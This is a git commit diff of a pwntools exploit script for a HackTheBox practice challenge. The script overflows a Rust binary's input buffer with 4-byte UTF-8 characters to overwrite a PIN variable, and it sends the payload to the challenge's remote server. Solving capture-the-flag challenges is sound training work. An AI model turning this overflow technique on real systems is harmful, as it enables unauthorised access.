8b07de463b573553fb1c1e02fc98e41167ba73f4
programmeruser2 <programmeruser@programmeruser.tk>
2023-10-25 21:31:32 -0400

    oxidized_rop

--- hackthebox/oxidized-rop.py
+++ hackthebox/oxidized-rop.py
@@ -1,7 +1,17 @@
 from pwn import *
-r = process('./oxidized-rop')
-# use utf-8 4 bytes characters to bypass the length limit since rust stores strings as utf-8
-r.sendline(b'1')
-r.sendline(b'a'*200+b'\x00')
+context.log_level = 'debug'
+#r = process('./oxidized-rop')
+#r = gdb.debug('./oxidized-rop', 'b _ZN12oxidized_rop4main17h3b2fbbcaac189096E\nc')
+r = remote('206.189.28.151', 32723)
+# use utf-8 4 byte characters to bypass the length limit since rust stores strings as utf-8
+#u3byte = b'\xed\x95\x9c'
+u4byte = b'\xf0\x90\x8d\x88'
+r.sendlineafter(b': ', b'1')
+#r.sendlineafter(b': ', u4byte*119+u3byte*3+b'\xed\x9f\xb8')
+# overflow into the pin variable
+# (we don't have enough info to do a rop)
+payload = u4byte*((0x1a8-0x10)//4) + chr(123456).encode('utf-8')
+r.sendlineafter(b': ', payload)
+r.sendlineafter(b': ', b'2')
 r.interactive()
 
